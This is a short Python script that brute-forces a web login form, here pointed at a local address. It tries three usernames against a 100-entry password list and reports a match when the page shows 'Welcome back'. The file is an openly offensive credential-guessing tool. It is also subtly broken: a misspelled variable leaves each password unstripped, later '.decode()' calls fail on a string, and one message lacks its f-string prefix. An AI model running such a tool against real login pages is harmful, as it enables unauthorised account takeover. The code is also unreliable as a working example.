#!/usr/bin/env python3
import requests
import sys

target = 'http://127.0.0.1:5000'
usernames = ['admin', 'user', 'test']
needle = 'Welcome back'

def web_brute():
	"""Web login form brute forcing"""

	for username in usernames:
		with open('top-100.txt', 'r') as password_lists:
			for password in password_lists:
				passowrd = password.strip('\n').encode()
				sys.stdout.write(f'[X] Attempting user:password -> {username}:{password.decode()}\r')
				sys.stdout.flush()
				r = requests.post(target, data={'username':username, 'password':password})

				if needle.encode() in r.content:
					sys.stdout.write('\n')
					sys.stdout.write(f'\t[>>>>>] Valid password "{password.decode()}" found for user "{username}"')
					exit()

			sys.stdout.flush()
			sys.stdout.write('\n')
			sys.stdout.write('\tNo password found for {username}')

if __name__ == '__main__':
	web_brute()